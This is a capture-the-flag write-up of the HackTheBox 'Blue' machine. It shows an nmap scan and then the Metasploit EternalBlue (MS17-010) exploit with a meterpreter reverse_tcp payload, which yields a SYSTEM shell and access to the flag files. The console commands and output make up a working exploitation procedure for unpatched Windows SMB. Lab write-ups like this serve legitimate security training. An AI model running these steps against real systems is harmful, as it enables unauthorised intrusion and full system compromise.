---
title: HTB Blue - writeup
date: 2022-06-30T23:13:33+01:00
author: Farrim Wildaxe
categories: [Writeup, HTB]
tags: [htb,writeup,blue,eternal_blue,metasploit]
img_path: /img/htb/blue
image:
  path: /assets/img/htb/blue/blue.jpg
  width: 700   # in pixels
  height: 516   # in pixels
  alt: image alternative text
---
## HTB/Blue


Blue machine is probably one of the easiest Windows machines on HackTheBox. Potential vulnerability is already hidden in machine name ;). But first thing first, let’s do an enumeration with nmap:
```shell
$ sudo nmap -sS -sV -sC -Pn -O -A -p1-20000 -T5 10.10.10.40
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-06 09:12 EST
Warning: 10.10.10.40 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.40
Host is up (0.11s latency).
Not shown: 19997 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 8.1 (96%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-03-06T14:20:12
|_  start_date: 2022-03-06T14:17:13
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-03-06T14:20:13+00:00
|_clock-skew: mean: 5m32s, deviation: 1s, median: 5m31s

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   94.69 ms 10.10.16.1
2   46.14 ms 10.10.10.40

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 153.82 seconds
```

When nmap finishes port scanning we see that Blue is running Windows 7 SP1 system. As we could find from the machine name there is a possibility, that it’s vulnerable to NSA EternalBlue exploit, let’s start metasploit and check it:
```shell
$ msfconsole -q
msf6 > search eternal

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```

In metasploit we have `exploit/windows/smb/ms17_010_eternalblue` exploit ready, so let’s use it:
```shell
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```

and check what options are available:
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.17.132   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

Above options are default ones, so we need to change it:
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost tun0
lhost => tun0
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.10.40
rhosts => 10.10.10.40
```
We will use `tun0` interface for `lhost`, so metasploit will automatically pick proper IP address for us, also we need to set a target IP address (`rhosts` variable), and we’re ready to go.

Lets run the exploit:
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[-] Handler failed to bind to 10.10.16.3:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] 10.10.10.40:445 - Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.16.3:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.16.3:4444 -> 10.10.10.40:49158 ) at 2022-03-06 11:09:44 -0500
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

Bingo! We’ve got the meterpreter session! Let’s check what is there:
```
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System             x64   0
 132   644   WmiPrvSE.exe
 272   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 356   348   csrss.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 408   348   wininit.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 428   400   csrss.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 484   400   winlogon.exe       x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 516   408   services.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 532   408   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 544   408   lsm.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 588   516   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 644   516   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 720   516   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 796   484   LogonUI.exe        x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 804   516   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 872   516   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 912   516   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 948   516   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 1072  516   spoolsv.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1104  516   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 1200  516   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 1364  516   VGAuthService.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
 1404  516   vmtoolsd.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 1704  516   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 1908  516   dllhost.exe        x64   0        NT AUTHORITY\SYSTEM
 1992  516   msdtc.exe          x64   0        NT AUTHORITY\NETWORK SERVICE
 2644  516   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 2716  516   SearchIndexer.exe  x64   0        NT AUTHORITY\SYSTEM
```

OK, we see that there are some processes running, let’s spawn a shell and check our user:
```
meterpreter > shell
Process 2600 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

That’s great, we have system privileges. Let's get some flags, at first user one:
```
C:\Windows\system32>cd c:\users
cd c:\users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of c:\Users

21/07/2017  06:56    <DIR>          .
21/07/2017  06:56    <DIR>          ..
21/07/2017  06:56    <DIR>          Administrator
14/07/2017  13:45    <DIR>          haris
12/04/2011  07:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   2,495,332,352 bytes free

c:\Users>cd haris
cd haris

c:\Users\haris>cd desktop
cd desktop

c:\Users\haris\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of c:\Users\haris\Desktop

24/12/2017  02:23    <DIR>          .
24/12/2017  02:23    <DIR>          ..
06/03/2022  14:17                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,495,332,352 bytes free

c:\Users\haris\Desktop>type user.txt
type user.txt
[flag redacted]
```

And then Administrator flag:
```
c:\Users\haris\Desktop>cd ..\..\Administrator\Desktop
cd ..\..\Administrator\Desktop

c:\Users\Administrator\Desktop>type root.txt
type root.txt
[flag redacted]
```

Getting the real flags is an exercise for the reader, you have all needed steps above ;)